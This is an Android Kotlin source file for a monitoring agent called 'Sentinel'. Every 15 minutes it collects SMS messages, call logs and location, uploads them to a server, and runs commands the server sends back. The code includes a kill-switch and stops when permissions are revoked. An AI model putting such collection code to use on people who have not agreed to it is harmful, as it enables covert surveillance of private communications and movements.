package com.sentinel.agent

import android.content.Context
import androidx.work.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/** Collects into the local outbox, then flushes it to the server. Idempotent on the server side. */
class SyncWorker(appContext: Context, params: WorkerParameters) : Worker(appContext, params) {

    override fun doWork(): Result {
        val ctx = applicationContext
        if (!Prefs.enabled(ctx)) return Result.success()
        val token = Prefs.token(ctx) ?: return Result.success()
        val base = Prefs.baseUrl(ctx)
        if (base.isBlank()) return Result.success()

        // 1. Kill-switch check before doing any collection work.
        try {
            val cfg = ApiClient.config(base, token)
            if (cfg.optString("status") != "active") {
                MonitorService.stop(ctx)
                return Result.success()
            }
        } catch (e: ApiClient.ApiException) {
            if (e.code == 401 || e.code == 403) { MonitorService.stop(ctx); return Result.success() }
            // Network failure: keep collecting locally, retry later.
        } catch (e: Exception) {
            // offline — continue and queue
        }

        // 2. Collect into the durable outbox.
        try {
            Collectors.sms(ctx).forEach { Prefs.append(ctx, it) }
            Collectors.calls(ctx).forEach { Prefs.append(ctx, it) }
            Collectors.location(ctx).forEach { Prefs.append(ctx, it) }
        } catch (e: SecurityException) {
            // permission revoked by the user — that is their right; stop and surface it
            Prefs.setEnabled(ctx, false)
            MonitorService.stop(ctx)
            return Result.success()
        }

        // 3. Flush the outbox.
        val lines = Prefs.outbox(ctx).lines().filter { it.isNotBlank() }.take(400)
        if (lines.isEmpty()) { touch(ctx); return Result.success() }
        return try {
            val arr = JSONArray()
            lines.forEach { arr.put(JSONObject(it)) }
            val battery = runCatching { Battery.read(ctx) }.getOrDefault(-1)
            val result = ApiClient.sync(base, token, arr, battery, BuildConfig.VERSION_NAME)
            // Commands are executed immediately after a successful sync, then acked.
            if (result.commands.length() > 0) {
                CommandRunner.handleAll(ctx, result.commands, token, base)
            }
            // Drop exactly what we sent; anything appended during the call stays queued.
            val remaining = Prefs.outbox(ctx).lines().filter { it.isNotBlank() }.drop(lines.size)
            Prefs.writeOutbox(ctx, if (remaining.isEmpty()) "" else remaining.joinToString("\n", postfix = "\n"))
            touch(ctx)
            Result.success()
        } catch (e: ApiClient.ApiException) {
            if (e.code == 401 || e.code == 403) { MonitorService.stop(ctx); Result.success() }
            else Result.retry()
        } catch (e: Exception) {
            Result.retry()
        }
    }

    private fun touch(ctx: Context) = Prefs.setLastSync(ctx, System.currentTimeMillis())

    companion object {
        const val UNIQUE = "sentinel-sync"
    }
}

object SyncScheduler {
    private const val PERIOD_MIN = 15L // WorkManager minimum

    fun schedule(ctx: Context) {
        val req = PeriodicWorkRequestBuilder<SyncWorker>(PERIOD_MIN, TimeUnit.MINUTES)
            .setConstraints(Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build())
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, WorkRequest.MIN_BACKOFF_MILLIS, TimeUnit.MILLISECONDS)
            .build()
        WorkManager.getInstance(ctx)
            .enqueueUniquePeriodicWork(SyncWorker.UNIQUE, ExistingPeriodicWorkPolicy.KEEP, req)
    }

    fun runNow(ctx: Context) {
        val req = OneTimeWorkRequestBuilder<SyncWorker>()
            .setConstraints(Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
        WorkManager.getInstance(ctx).enqueue(req)
    }

    fun cancel(ctx: Context) {
        WorkManager.getInstance(ctx).cancelUniqueWork(SyncWorker.UNIQUE)
    }
}

object Battery {
    fun read(ctx: Context): Int {
        val i = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = i?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = i?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        if (level < 0 || scale <= 0) return -1
        return (level * 100.0 / scale).toInt()
    }
}
